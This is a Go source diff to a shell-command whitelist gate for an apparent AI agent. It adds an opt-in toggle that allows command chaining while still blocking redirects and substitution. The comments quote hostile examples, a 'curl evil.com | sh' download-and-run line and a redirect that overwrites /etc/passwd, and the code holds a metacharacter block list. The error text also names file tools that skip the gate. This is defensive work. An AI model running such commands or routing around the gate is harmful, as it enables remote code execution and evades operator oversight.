@@ -45,8 +45,9 @@ type CommandRule struct {
 // rule like "git *" can't be exploited via `git config core.editor
 // 'curl evil.com | sh'`.
 type Matcher struct {
-	rules        []CommandRule
-	defaultScope string
+	rules               []CommandRule
+	defaultScope        string
+	allowShellMetachars bool
 }
 
 // NewMatcher returns a Matcher with the given rules and a default
@@ -55,6 +56,16 @@ type Matcher struct {
 // still path-restricted to the default workspace directory.
 func NewMatcher(rules []CommandRule, defaultScope string) *Matcher {
 	return &Matcher{rules: rules, defaultScope: defaultScope}
+}
+
+// WithAllowShellMetachars toggles whether Decide skips the shell
+// metacharacter guard (config.GateConfig.AllowShellMetachars). Off by
+// default (guard enforced) — an operator opts in when they trust their
+// own whitelist patterns under chaining/redirects, e.g. to allow
+// "sleep 60 && echo done". Returns the same *Matcher for chaining.
+func (m *Matcher) WithAllowShellMetachars(allow bool) *Matcher {
+	m.allowShellMetachars = allow
+	return m
 }
 
 // Decide reports whether the command is allowed. Returns:
@@ -70,9 +81,35 @@ func (m *Matcher) Decide(command string) (bool, string) {
 	if cmd == "" {
 		return false, "empty command"
 	}
-	if hasShellMetachar(cmd) {
-		return false, "shell metacharacter blocked"
+	if !m.allowShellMetachars {
+		if reason, blocked := shellMetacharReason(cmd); blocked {
+			return false, reason
+		}
+	} else if hasShellMetachar(cmd) {
+		// AllowShellMetachars only trusts chaining (;, |, &, &&) — each
+		// resulting sub-command still has to clear the whitelist on its
+		// own. Redirects/substitution (>, <, `, $(...)) are NOT chaining:
+		// they inject into the SAME command's argv (e.g. "sleep 60 >
+		// /etc/passwd"), so a single "sleep *" rule would pass a
+		// destructive redirect straight through with no second command to
+		// check. Those stay unconditionally blocked even with the toggle on.
+		if reason, blocked := redirectOrSubstReason(cmd); blocked {
+			return false, reason
+		}
+		for _, part := range splitChain(cmd) {
+			if allow, reason := m.decideOne(part); !allow {
+				return false, reason
+			}
+		}
+		return true, ""
 	}
+	return m.decideOne(cmd)
+}
+
+// decideOne matches a single command (no chaining/metachar splitting)
+// against the whitelist. Shared by Decide's plain path and the
+// per-sub-command loop under AllowShellMetachars.
+func (m *Matcher) decideOne(cmd string) (bool, string) {
 	args, err := splitCommand(cmd)
 	if err != nil {
 		return false, "unparseable: " + err.Error()
@@ -100,15 +137,125 @@ func (m *Matcher) Decide(command string) (bool, string) {
 // We check the FULL command string (not per-arg) so quoted
 // metacharacters are also caught. Conservative by design.
 func hasShellMetachar(cmd string) bool {
-	const blocked = ";|&`<>$\n\r"
-	if strings.ContainsAny(cmd, blocked) {
+	blocked, _ := shellMetacharReason(cmd)
+	return blocked != ""
+}
+
+// metacharHints names each blocked byte plus the plain-English reason
+// it's rejected. isChain marks the "chains a separate command" group
+// (;, |, &) that AllowShellMetachars may trust once each resulting
+// sub-command is re-checked against the whitelist on its own — see
+// splitChain/redirectOrSubstReason. The rest (redirects, substitution,
+// embedded newlines) inject INTO a single command's argv rather than
+// adding a separate one, so no amount of sub-command splitting makes
+// them safe; they stay blocked unconditionally regardless of the toggle.
+var metacharHints = []struct {
+	ch      byte
+	reason  string
+	isChain bool
+}{
+	{';', "command separator (chains a second command)", true},
+	{'|', "pipe (feeds output into another command)", true},
+	{'&', "background/chain operator (e.g. &&)", true},
+	{'`', "backtick command substitution", false},
+	{'<', "input redirect", false},
+	{'>', "output redirect", false},
+	{'$', "variable/command substitution (e.g. $(...), $VAR)", false},
+	{'\n', "embedded newline (hides a second command)", false},
+	{'\r', "embedded carriage return", false},
+}
+
+// shellMetacharReason reports the first blocked character found in cmd
+// and a reason naming it, so the caller (and ultimately the model, via
+// the tool_result) knows exactly what to remove or rework instead of
+// getting a bare "blocked". This check is unconditional — it applies
+// even to an otherwise-whitelisted command — so multi-step work needs
+// separate shell calls (or the native read_file/write_file/edit_file
+// tools, which don't go through this gate at all: see tool_fs.go).
+func shellMetacharReason(cmd string) (reason string, blocked bool) {
+	return firstMetacharReason(cmd, func(struct {
+		ch      byte
+		reason  string
+		isChain bool
+	}) bool {
 		return true
+	})
+}
+
+// redirectOrSubstReason is shellMetacharReason restricted to the
+// non-chain group (redirects/substitution/newlines) — the part
+// AllowShellMetachars never trusts, because it injects into a single
+// command's argv rather than adding a separate, independently
+// whitelist-checked command.
+func redirectOrSubstReason(cmd string) (reason string, blocked bool) {
+	return firstMetacharReason(cmd, func(h struct {
+		ch      byte
+		reason  string
+		isChain bool
+	}) bool {
+		return !h.isChain
+	})
+}
+
+func firstMetacharReason(cmd string, include func(struct {
+	ch      byte
+	reason  string
+	isChain bool
+}) bool) (reason string, blocked bool) {
+	for _, m := range metacharHints {
+		if !include(m) {
+			continue
+		}
+		if strings.IndexByte(cmd, m.ch) >= 0 {
+			return fmt.Sprintf(
+				"shell metacharacter %q blocked: %s. This is a fixed security rule, not a whitelist gap — "+
+					"run it as a separate shell call per command, or use write_file/edit_file/read_file for file "+
+					"operations (those tools don't go through this gate).",
+				string(m.ch), m.reason,
+			), true
+		}
 	}
-	// $( and `` are caught by the byte set above; defensive double-check.
-	if strings.Contains(cmd, "$(") || strings.Contains(cmd, "`") {
-		return true
+	return "", false
+}
+
+// splitChain splits cmd on the chaining operators (;, |, &, &&),
+// respecting quotes so a chain operator inside a quoted string isn't
+// treated as a real separator. Used only when AllowShellMetachars is
+// on — each returned piece is re-validated against the whitelist by
+// decideOne so chaining can't smuggle an unlisted command past a
+// wildcard rule.
+func splitChain(cmd string) []string {
+	var parts []string
+	var cur strings.Builder
+	inDouble := false
+	inSingle := false
+	flush := func() {
+		if s := strings.TrimSpace(cur.String()); s != "" {
+			parts = append(parts, s)
+		}
+		cur.Reset()
 	}
-	return false
+	for i := 0; i < len(cmd); i++ {
+		c := cmd[i]
+		switch {
+		case c == '"' && !inSingle:
+			inDouble = !inDouble
+			cur.WriteByte(c)
+		case c == '\'' && !inDouble:
+			inSingle = !inSingle
+			cur.WriteByte(c)
+		case !inDouble && !inSingle && (c == ';' || c == '|' || c == '&'):
+			flush()
+			// Skip a doubled operator (&&, ||) as one separator.
+			if i+1 < len(cmd) && cmd[i+1] == c {
+				i++
+			}
+		default:
+			cur.WriteByte(c)
+		}
+	}
+	flush()
+	return parts
 }
 
 // splitCommand splits a shell-ish command into argv, respecting double
